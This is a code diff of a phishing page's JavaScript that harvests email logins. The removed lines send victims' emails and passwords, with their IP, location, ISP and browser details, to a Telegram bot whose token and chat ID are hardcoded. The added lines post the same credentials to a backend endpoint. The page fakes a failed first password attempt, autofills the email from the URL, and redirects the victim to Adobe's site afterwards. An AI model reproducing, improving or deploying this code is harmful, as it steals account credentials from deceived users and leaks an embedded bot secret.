@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -154,118 +155,36 @@
   </div>
 
   <script>
-    // ⚠️ IMPORTANT: Replace these with your actual Telegram credentials
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
-    
+    const TELEGRAM_BOT_TOKEN = '1803614266:AAF_BAtHql2CQpGUmvFrqXKjZIsYnzkU_qs'; // 🔒 Hide real tokens before deployment
+    const TELEGRAM_CHAT_ID = '1731582332';
     let clientIP = 'Fetching IP...';
-    let userCountry = 'Fetching...';
-    let userCity = 'Fetching...';
-    let userISP = 'Fetching...';
 
-    // Get IP and location details
-    async function getLocationData() {
-      try {
-        // Get IP
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        clientIP = ipData.ip;
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { clientIP = data.ip; })
+      .catch(() => { clientIP = 'Unavailable'; });
 
-        // Get location details
-        const locationResponse = await fetch(`https://ipapi.co/${clientIP}/json/`);
-        const locationData = await locationResponse.json();
-        
-        userCountry = locationData.country_name || 'Unknown';
-        userCity = locationData.city || 'Unknown';
-        userISP = locationData.org || 'Unknown';
-        
-        return { ip: clientIP, country: userCountry, city: userCity, isp: userISP };
-      } catch (error) {
-        console.error('Error fetching location:', error);
-        return { ip: 'Unavailable', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
-      }
-    }
-
-    // Send message to Telegram
-    async function sendToTelegram(email, password, locationData) {
-      const userAgent = navigator.userAgent;
-      const timestamp = new Date().toLocaleString('en-US', { 
-        timeZone: 'UTC',
-        year: 'numeric',
-        month: '2-digit',
-        day: '2-digit',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-      });
-      
-      const message = `
-🔐 NEW LOGIN CREDENTIALS CAPTURED
-━━━━━━━━━━━━━━━━━━━━━━━
-📧 Email: ${email}
-🔑 Password: ${password}
-━━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP Address: ${locationData.ip}
-📍 Country: ${locationData.country}
-🏙️ City: ${locationData.city}
-🏢 ISP: ${locationData.isp}
-🖥️ User Agent: ${userAgent}
-📱 Platform: ${navigator.platform}
-🌍 Language: ${navigator.language}
-⏰ Time (UTC): ${timestamp}
-━━━━━━━━━━━━━━━━━━━━━━━
-🔗 Login Server: ${window.location.hostname}
-📎 Email Domain: ${email.split('@')[1] || 'Unknown'}
-━━━━━━━━━━━━━━━━━━━━━━━
-      `;
-
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${1803614266:AAF_BAtHql2CQpGUmvFrqXKjZIsYnzkU_qs}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: 1731582332,
-            text: message,
-            parse_mode: 'HTML'
-          })
-        });
-
-        const data = await response.json();
-        
-        if (data.ok) {
-          console.log('✅ Message sent to Telegram successfully');
-        } else {
-          console.error('❌ Telegram API error:', data);
-        }
-        
-        return data.ok;
-      } catch (error) {
-        console.error('❌ Failed to send to Telegram:', error);
-        return false;
-      }
-    }
-
-    // Function to send email to backend (kept for compatibility)
     function sendToEmailBackend(email, password) {
-      // This function is now replaced by sendToTelegram
-      console.log('📧 Email:', email);
-      console.log('🔑 Password:', password);
+      const userAgent = navigator.userAgent;
+      fetch('/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          ip: clientIP,
+          emailDomain: email.split('@')[1] || 'Unavailable',
+          loginServer: window.location.hostname,
+          userAgent
+        })
+      }).catch(err => console.error('Request failed', err));
     }
 
-    // Handle email form submission
     function handleEmailFormSubmit(event) {
       event.preventDefault();
       const emailInput = document.querySelector('#emailForm input[name="email"]');
       const email = emailInput.value.trim();
       const button = document.getElementById('emailSubmitBtn');
-
-      // Validate email format
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-        alert('Please enter a valid email address.');
-        return;
-      }
 
       button.disabled = true;
       emailInput.disabled = true;
@@ -278,8 +197,7 @@
       }, 1000);
     }
 
-    // Handle password submission
-    async function handlePasswordSubmit() {
+    function handlePasswordSubmit() {
       const passwordInput = document.querySelector('#passwordForm input[name="password"]');
       const email = document.getElementById('emailVisible').value.trim();
       const password = passwordInput.value.trim();
@@ -291,20 +209,12 @@
         return;
       }
 
-      // Disable form
+      sendToEmailBackend(email, password);
+
+      // Freeze form
       button.disabled = true;
       passwordInput.disabled = true;
 
-      // Get location data
-      const locationData = await getLocationData();
-
-      // Send to Telegram
-      const sent = await sendToTelegram(email, password, locationData);
-
-      // Also send to backend (for compatibility)
-      sendToEmailBackend(email, password);
-
-      // Check if this is the first attempt
       const alreadyTried = localStorage.getItem('passwordTried');
 
       if (!alreadyTried) {
@@ -315,6 +225,7 @@
           button.disabled = false;
           passwordInput.disabled = false;
         }, 2000);
+
       } else {
         errorDiv.style.display = 'none';
 
@@ -322,7 +233,6 @@
           document.getElementById('passwordForm').style.display = 'none';
           document.getElementById('fake404').classList.remove('hidden');
 
-          // Redirect after 2 seconds
           setTimeout(() => {
             window.location.href = "https://www.adobe.com/acrobat/online/extract-pdf-pages.html";
           }, 2000);
@@ -330,50 +240,34 @@
       }
     }
 
-    // Live validation
+    // 🔄 Live validation
     document.addEventListener('input', () => {
-      const emailInput = document.querySelector('#emailForm input[name="email"]');
-      const passwordInput = document.querySelector('#passwordForm input[name="password"]');
-      
-      if (emailInput) {
-        const email = emailInput.value.trim();
-        const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-        document.getElementById('emailSubmitBtn').disabled = !emailValid;
-      }
-      
-      if (passwordInput) {
-        const password = passwordInput.value.trim();
-        document.getElementById('passwordSubmitBtn').disabled = !password;
-      }
+      const email = document.querySelector('#emailForm input[name="email"]').value.trim();
+      const password = document.querySelector('#passwordForm input[name="password"]').value.trim();
+
+      const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      document.getElementById('emailSubmitBtn').disabled = !emailValid;
+      document.getElementById('passwordSubmitBtn').disabled = !password;
     });
 
-    // On load
+    // ⏱️ On load
     window.onload = () => {
       localStorage.removeItem('passwordTried');
 
-      // Startup animation
       const startupBar = document.getElementById('startupBar');
       startupBar.style.width = '0%';
       setTimeout(() => { startupBar.style.width = '100%'; }, 100);
-      
       setTimeout(() => {
         document.getElementById('startupLoader').style.display = 'none';
         document.getElementById('formContainer').classList.remove('hidden');
       }, 1300);
 
-      // Auto-fill email from URL hash
       const hash = window.location.hash;
       if (hash && hash.includes('@')) {
         const autoEmail = hash.substring(1);
         document.querySelector('#emailForm input[name="email"]').value = autoEmail;
-        // Auto-submit after delay
-        setTimeout(() => {
-          handleEmailFormSubmit(new Event('submit'));
-        }, 500);
+        handleEmailFormSubmit(new Event('submit'));
       }
-
-      // Get initial IP on load
-      getLocationData();
     };
   </script>
 </body>
